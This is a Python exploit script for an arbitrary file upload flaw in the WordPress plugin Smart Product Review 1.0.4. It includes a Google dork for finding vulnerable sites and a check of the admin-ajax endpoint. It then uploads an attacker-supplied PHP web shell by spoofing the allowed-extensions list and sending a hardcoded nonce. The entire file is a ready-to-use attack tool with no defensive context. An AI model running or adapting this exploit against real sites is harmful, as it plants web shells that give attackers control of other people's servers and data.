import os.path
from os import path
import json
import requests;
import time
import sys

def banner():
    animation = "|trhacknon\\"
    for i in range(20):
        time.sleep(0.1)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()
        #do something
    print("\033[1;34;40mSmart Product Review 1.0.4 - Arbitrary File Upload\n")
print("\033[1;34;40mDork:inurl:/wp-content/plugins/smart-product-review/\n")

def usage():
	print("\033[1;34;40mUsage: python3 Auto-wp.py [target url] [your shell]\n")
	print("\033[1;34;40mEx: python3 Auto-wp.py https://example.com cks.phtml/cks.php4\n")

def vuln_check(uri):
	response = requests.get(uri)
	raw = response.text

	if ("No script kiddies please!!" in raw):
		return False;
	else:
		return True;

def main():

	banner()
	if(len(sys.argv) != 3):
		usage();
		sys.exit(1);

	base = sys.argv[1]
	file_path = sys.argv[2]

	ajax_action = 'sprw_file_upload_action'
	admin = '/wp-admin/admin-ajax.php';

	uri = base + admin + '?action=' + ajax_action ;
	check = vuln_check(uri);

	if(check == False):
		print("(*) Target not vulnerable!");
		sys.exit(1)

	if( path.isfile(file_path) == False):
		print("(*) Invalid file!")
		sys.exit(1)

	files = {'files[]' : open(file_path)}
	data = {
	"allowedExtensions[0]" : "jpg",
    "allowedExtensions[1]" : "php4",
    "allowedExtensions[2]" : "phtml",
    "allowedExtensions[3]" : "png",
	"qqfile" : "files",
    "element_id" : "6837",
    "sizeLimit" : "12000000",
    "file_uploader_nonce" : "2b102311b7"
	}
	print("Uploading Shell...");
	response = requests.post(uri, files=files, data=data )
	file_name = path.basename(file_path)
	if("ok" in response.text):
		print("Shell Uploaded!")
		print("Shell URL on your Review/Comment");
	else:
		print("Shell Upload Failed")
		sys.exit(1)

main();
